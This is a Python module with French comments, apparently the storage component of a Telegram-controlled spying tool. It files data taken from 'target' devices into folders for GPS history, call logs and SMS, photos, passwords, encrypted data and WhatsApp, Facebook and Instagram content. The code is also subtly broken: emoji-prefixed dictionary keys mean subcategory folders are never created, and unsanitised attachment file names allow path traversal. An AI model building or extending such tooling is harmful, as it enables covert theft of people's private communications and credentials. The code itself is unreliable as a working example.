import os
import logging
from telegram import Document

class FileManager:
    def __init__(self, data_path):
        """Initialise le gestionnaire de fichiers avec le chemin de données."""
        self.data_path = data_path
        self.logger = logging.getLogger(__name__)
        os.makedirs(self.data_path, exist_ok=True)

    def create_target_directory(self, device_id):
        """Crée un dossier pour un appareil donné."""
        target_path = os.path.join(self.data_path, device_id)
        try:
            os.makedirs(target_path, exist_ok=True)
            for category in ["Localisation", "Appels & SMS", "Photos & Vidéos", "Applications", "Sécurité", "Réseaux sociaux"]:
                category_path = os.path.join(target_path, category)
                os.makedirs(category_path, exist_ok=True)
                for subcategory in self.get_subcategories(category):
                    os.makedirs(os.path.join(category_path, subcategory), exist_ok=True)
            self.logger.info(f"Dossier créé pour l'appareil {device_id}")
        except OSError as e:
            self.logger.error(f"Erreur lors de la création du dossier pour {device_id} : {e}")
            raise

    def get_subcategories(self, category):
        """Retourne les sous-catégories pour une catégorie donnée."""
        categories = {
            "📍 Localisation": ["GPS", "Historique des positions"],
            "📞 Appels & SMS": ["Journal d'appels", "Messages"],
            "🖼️ Photos & Vidéos": ["Photos", "Vidéos"],
            "📱 Applications": ["Applications installées", "Données des applications"],
            "🔒 Sécurité": ["Mots de passe", "Données chiffrées"],
            "🌐 Réseaux sociaux": ["WhatsApp", "Facebook", "Instagram", "Autres"],
        }
        return categories.get(category, [])

    def save_file(self, document: Document, device_id: str, category: str, subcategory: str):
        """Enregistre un fichier téléchargé dans le dossier approprié."""
        try:
            file_path = os.path.join(self.data_path, device_id, category, subcategory, document.file_name)
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            file = document.get_file()
            file.download(file_path)
            self.logger.info(f"Fichier {document.file_name} enregistré dans {category}/{subcategory} pour {device_id}")
        except Exception as e:
            self.logger.error(f"Erreur lors de l'enregistrement du fichier pour {device_id} : {e}")
            raise

    def list_files(self, device_id: str, category: str, subcategory: str):
        """Liste les fichiers dans une sous-catégorie donnée."""
        try:
            folder_path = os.path.join(self.data_path, device_id, category, subcategory)
            if not os.path.exists(folder_path):
                return []
            return [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        except Exception as e:
            self.logger.error(f"Erreur lors de la liste des fichiers pour {device_id} : {e}")
            return []

    def delete_target(self, device_id: str):
        """Supprime le dossier d'un appareil."""
        try:
            target_path = os.path.join(self.data_path, device_id)
            if os.path.exists(target_path):
                import shutil
                shutil.rmtree(target_path)
                self.logger.info(f"Dossier de l'appareil {device_id} supprimé")
        except Exception as e:
            self.logger.error(f"Erreur lors de la suppression du dossier pour {device_id} : {e}")
            raise
